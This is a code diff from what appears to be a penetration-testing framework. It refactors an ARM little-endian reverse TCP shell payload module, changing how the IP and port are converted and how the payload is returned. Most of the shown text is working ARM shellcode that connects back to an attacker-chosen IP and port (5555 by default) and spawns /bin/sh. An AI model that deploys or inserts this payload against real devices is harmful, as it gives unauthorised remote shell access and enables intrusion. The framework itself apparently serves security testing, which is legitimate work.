@@ -18,14 +18,17 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "armle"
+
     target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    port = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
+    port = exploits.Option(
+        5555, 'Reverse TCP Port', validators=validators.integer
+    )
 
     def generate(self):
-        reverse_ip = self.convert_ip(self.target)
-        reverse_port = self.convert_port(self.port)
+        reverse_ip = validators.convert_ip(self.target)
+        reverse_port = validators.convert_port(self.port)
 
-        self.payload = (
+        return (
             "\x01\x10\x8F\xE2" +
             "\x11\xFF\x2F\xE1" +
             "\x02\x20\x01\x21" +
@@ -40,8 +43,8 @@ class Exploit(payloads.Payload):
             "\x92\x1a\x05\xb4" +
             "\x69\x46\x0b\x27" +
             "\x01\xDF\xC0\x46" +
-            "\x02\x00" + reverse_port +     # "\x12\x34" struct sockaddr and port
-            reverse_ip +                    # reverse ip address
-            "\x2f\x62\x69\x6e" +            # /bin
-            "\x2f\x73\x68\x00"              # /sh\0
+            "\x02\x00" + reverse_port +  # "\x12\x34" struct sockaddr and port
+            reverse_ip +                 # reverse ip address
+            "\x2f\x62\x69\x6e" +         # /bin
+            "\x2f\x73\x68\x00"           # /sh\0
         )
